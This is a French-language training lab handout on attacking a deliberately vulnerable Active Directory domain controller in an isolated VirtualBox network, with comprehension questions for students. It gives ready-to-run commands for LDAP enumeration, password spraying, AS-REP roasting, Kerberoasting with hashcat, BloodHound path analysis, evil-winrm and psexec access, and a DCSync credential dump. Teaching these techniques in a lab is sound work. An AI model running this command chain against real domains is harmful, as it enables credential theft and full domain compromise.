# Sécurité de l'Active Directory - TP 1

> ⚠️ Réaliser un compte rendu de toutes les étapes de manière à ce que vous puissiez le reprendre plus tard quand vous en avez besoin, et répondez aux questions.
>
> Pensez à prendre des captures d'écran !

## Prérequis

- Kali Linux (vous pouvez télécharger une VM VirtualBox directement sur [kali.org/get-kali](https://www.kali.org/get-kali/#kali-virtual-machines)).
  - Allouer si vous le pouvez 3 Go de RAM, sinon 2 Go suffira mais hashcat refusera de se lancer.
- Télécharger la machine virtuelle (contrôleur de domaine vulnérable) : voir le lien fourni par votre formateur.
- Il faut que toutes les machines virtuelles soient configurées en **"Réseau privé hôte"** en mode d'accès réseau.
  - Pour la VM Windows : Adapter 1 → Mode d'accès réseau : *Réseau privé hôte* (VirtualBox Host-Only Ethernet Adapter), Mode Promiscuité : *Refuser*, Câble branché : coché.
- Le réseau privé hôte dispose d'un serveur DHCP, il n'y aura aucun besoin de configurer les adresses IP à la main. L'adresse du réseau est généralement `192.168.56.0/24` et la machine hôte peut joindre les VMs.

> 💡 Remarque : une WSL peut potentiellement remplacer la VM Kali (non testé).

- La Kali doit avoir deux interfaces réseau :
  - La première en **NAT** pour avoir accès à Internet.
  - La deuxième en **Réseau privé hôte** pour communiquer avec le contrôleur de domaine.
- Si le réseau privé hôte n'existe pas, créez-en un dans VirtualBox via : `Fichier > Outils > Réseau` (Ctrl+H), onglet *Host-only Networks*, puis *Créer*.
- Sur la Kali, pensez à faire un `apt update`.

## Scan

- Lancer les 2 machines virtuelles et vérifier leurs adresses IP, et si un ping fonctionne entre elles.
- Vérifiez l'adresse réseau de votre interface Host-only (dans l'exemple : `192.168.56.0/24`).
- Réaliser un scan nmap du réseau pour identifier l'adresse IP de la VM Windows, et notamment le contrôleur de domaine :

```bash
sudo nmap -sS --top-ports 1000 -sV 192.168.56.0/24 -sC
```

> ⚠️ Si le scan prend plusieurs heures, c'est que vous vous êtes trompé d'adresse réseau.

- Réaliser un autre scan nmap d'exécution de script LDAP :

```bash
nmap -Pn -p389 -T4 --script ldap-rootdse <IP_ADDR_DC>
```

Cette commande doit permettre de confirmer le nom de domaine (`rootDomainNamingContext`).

## LDAP

- Comme nous n'avons pas encore d'identifiants, nous pouvons tester d'interroger l'annuaire LDAP anonymement :

```bash
ldapsearch -x -H ldap://<IP_ADDR_DC> -D 'CN=anonymous,DC=epita,DC=local' -w '' -b 'DC=epita,DC=local' 'objectClass=user'
```

- ❓ Observer la commande :
  - Expliquer les arguments de la commande.
  - À quoi peuvent nous servir les informations retournées par la commande ?

> 💡 Remarque : la configuration comporte des anomalies, il n'est normalement pas possible de consulter l'annuaire de manière anonyme.

- On va maintenant utiliser l'outil [go-windapsearch](https://github.com/ropnop/go-windapsearch) :

```bash
./windapsearch-linux-amd64 --dc <IP_ADDR_DC> -m users --full
```

- Faites un grep sur `description`, et observez les potentiels mots de passe.
- Faites un script ou un one-liner pour :
  - Extraire le `sAMAccountName` de chaque utilisateur et l'enregistrer dans un fichier `users.txt`.
  - Extraire le champ `description` de chaque utilisateur et l'enregistrer dans un fichier `passwords.txt` (vous pouvez finir à la main pour les mots de passe).
- Installer `nxc` (NetExec), s'il n'est pas déjà installé, puis lancer `nxcdb` pour créer un workspace :

```bash
nxcdb
workspace create labad
exit
```

- Lancer la commande suivante :

```bash
nxc smb <IP_ADDR_DC> -u users.txt -p passwords.txt
```

- ❓ Observer la commande :
  - Que réalise cette commande ?
  - Pourquoi certains messages d'erreur sont différents des autres ?

- Énumérer la politique de mot de passe avec la commande suivante :

```bash
nxc smb <IP_ADDR_DC> -u <USERNAME> -p <PASSWORD> --pass-pol
```

- ❓ Expliquer les flags de complexité retournés.

## AS-REP Roasting

> ⚠️ Les mots de passe par défaut ont expiré, la commande ci-dessous ne fonctionnera donc pas directement. Modifiez le mot de passe d'un compte par un mot simple (`123456`, `password`, `admin`, etc.) à l'aide de la commande suivante :

```bash
impacket-changepasswd <DOMAIN>/<USER>:'<OLD_OR_TEMP_PASSWORD>'@<DOMAIN_IP> -newpass '<NEW_PASSWORD>'
```

- Lancer la commande `impacket-GetNPUsers` avec le fichier `users.txt` pour trouver des utilisateurs AS-REP roastables :

```bash
impacket-GetNPUsers -usersfile users.txt -no-pass -dc-ip <IP_ADDR_DC> epita.local/ -outputfile asrep_hashes.txt
```

- Utiliser **hashcat** sur le fichier `asrep_hashes.txt` pour casser les hashs (mode Kerberos 5, etype 23, AS-REP).
- Copier les mots de passe crackés dans un fichier texte `passwords_asrep.txt`, et réitérer la commande `nxc` de password spraying, mais cette fois en ajoutant le paramètre `--continue-on-success` :

```bash
nxc smb <IP_ADDR_DC> -u users.txt -p passwords_asrep.txt --continue-on-success
```

- ❓ Observer la commande :
  - À quoi sert le paramètre `--continue-on-success` ?
  - Par quoi est représenté un couple identifiant/mot de passe qui a permis l'authentification ?
  - Quels sont les identifiants/mots de passe valides ? (pensez à bien les garder quelque part : si vous avez créé un workspace `nxcdb`, vous devriez pouvoir y accéder via)

```bash
nxcdb
proto smb
creds
```

## BloodHound

### Installation

- Installez BloodHound Legacy depuis [BloodHound-Legacy releases](https://github.com/SpecterOps/BloodHound-Legacy/releases) (`BloodHound-linux-x64.zip`).
- Installer le collecteur `bloodhound.py` :

```bash
sudo apt install bloodhound.py
```

- Lancer Neo4j (moteur de base de données de graphe pour BloodHound) :

```bash
sudo neo4j start
```

- Ouvrir un navigateur, naviguer vers `http://localhost:7474/browser/` et saisir le couple identifiant/mot de passe `neo4j:neo4j`. Il vous sera demandé de changer le mot de passe.
- Lancer l'exécutable `BloodHound` de l'archive `BloodHound-linux-x64.zip` et saisir vos identifiants Neo4j :

```bash
./BloodHound --no-sandbox
```

### Collecte des informations

- Utiliser la commande `bloodhound-python` avec un identifiant/mot de passe valide :

```bash
bloodhound-python -ns <IP_ADDR_DC> -d epita.local -u '<USERNAME>' -p '<PASSWORD>' --dns-timeout 10 --dns-tcp -v --zip -c all
```

- ❓ Observer la commande :
  - Qu'est-ce que la commande a fait ?
  - Qu'est-ce que le fichier généré contient ?

- Il est aussi possible de réaliser la même opération avec `netexec` :

```bash
nxc ldap dc.epita.local -u <USERNAME> -p <PASSWORD> --bloodhound -c all --dns-server <IP_ADDR_DC> --dns-tcp --dns-timeout 10
```

- Exécuter la commande suivante :

```bash
nxc ldap dc.epita.local -u <USERNAME> -p <PASSWORD> --dns-server <IP_ADDR_DC> --dns-tcp --dns-timeout 10 -M get-network -o ONLY_HOSTS=true
```

- ❓ Observer la commande :
  - Qu'est-ce que la commande fait ?
  - Qu'est-ce que le fichier généré contient ?

### Analyse dans BloodHound

- Dans BloodHound, cliquer sur **"Upload Data"** et sélectionner le(s) fichier(s) généré(s) précédemment.
- ❓ Essayer les requêtes prédéfinies dans l'onglet **"Analysis"** :
  - Quelles requêtes renvoient des informations non vides ?
  - Montrer et expliquer les résultats intéressants.
  - Lister les Service Principal Names "kerberoastables" avec la bonne requête.
- Chercher un utilisateur dont on connaît le mot de passe, faire un clic droit sur l'élément puis **"Mark User as Owned"**.
- Il est possible de connecter BloodHound et NetExec de manière à ce que NetExec marque automatiquement les utilisateurs comme "Owned" dans BloodHound lorsqu'il trouve des identifiants/mots de passe valides. Pour cela, éditer le fichier `~/.nxc/nxc.conf` et modifier :

```ini
bh_enabled = True
bh_pass = <MDP_CHOISI>
```

- Vous pouvez retester les commandes `nxc` précédentes de spraying : l'utilisateur est automatiquement marqué dans BloodHound.
- Les requêtes **"Shortest Path from Owned Principals"** permettent de créer un chemin à partir des utilisateurs "Owned".
- Il est aussi possible de calculer un chemin entre deux nœuds : par exemple sélectionner un utilisateur compromis, cliquer sur l'icône **"Pathfinding"**, saisir `ADMINS DU DOMAINE@EPITA.LOCAL` comme nœud d'arrivée, puis cliquer sur l'icône *play*.
- Un graphe d'attaque est généré. Pour une meilleure visibilité, cliquer sur l'icône **"Settings"** et choisir *Always Display* pour *Edge Label Display* et *Node Label Display*.

## Kerberoasting

- Utiliser la commande `impacket-GetUserSPNs` avec un identifiant valide pour lister les SPN kerberoastables :

```bash
impacket-GetUserSPNs epita.local/<USERNAME>:<PASSWORD> -dc-ip <IP_ADDR_DC>
```

- Ensuite, relancer la commande avec les paramètres `-request` (pour demander un ticket TGS) et `-outputfile` (pour l'enregistrer dans un fichier texte) :

```bash
impacket-GetUserSPNs epita.local/<USERNAME>:<PASSWORD> -dc-ip <IP_ADDR_DC> -outputfile kerb_hash.txt -request
```

- Utiliser hashcat pour casser les hashs stockés dans le fichier.
- ❓ Quel mode et quel paramètre utiliser pour mener à bien le cassage du hash ?
- ❓❓ Quels mots de passe avez-vous découverts ?

## WinRM

- Réitérer le password spraying mais cette fois sur WinRM :

```bash
nxc winrm <IP_ADDR_DC> -u users.txt -p passwords_asrep.txt --continue-on-success
```

- Identifier les identifiants qui ont fonctionné et utiliser `evil-winrm` pour s'y connecter :

```bash
evil-winrm -i <IP_ADDR_DC> -u <USERNAME> -p '<PASSWORD>'
```

- ❓ Observer la commande et son résultat :
  - À quoi sert `evil-winrm` ?
  - Qu'est-ce que la commande a fait ?

## Bonus

> Nous allons tenter de trouver le mot de passe de l'administrateur.

- Générez une liste de mots de passe à partir du mot `toto` :

```bash
echo "toto" > wordlist.txt
```

- Créez une règle hashcat dans un fichier `rules.txt` :

```text
c $8 $9 $1 $0 $0 $!
```

> ℹ️ `c` (Capitalize), `$8` (Append 8), `$9` (Append 9), etc.

- Générez la liste de mots dérivés à l'aide de la règle :

```bash
hashcat --stdout -r rules.txt wordlist.txt
```

- Utiliser la commande `nxc` pour tester toutes les possibilités sur le compte Administrateur :

```bash
nxc smb <DC_IP> -u Administrateur -p wordlist.txt
```

- Dès que vous avez trouvé le mot de passe, connectez-vous et changez-le.
- Utilisez `impacket-psexec` pour obtenir une exécution distante :

```bash
impacket-psexec '<DOMAIN>/<COMPTE>@<DC_IP>:<PASSWORD>'
```

- Et effectuez un DCSync avec `impacket-secretsdump` :

```bash
impacket-secretsdump '<DOMAIN>/<COMPTE>@<DC_IP>:<PASSWORD>'
```

---

*Document réalisé dans le cadre de la préparation à la certification eJPT / basé sur le TP "Sécurité de l'Active Directory - TP 1".*
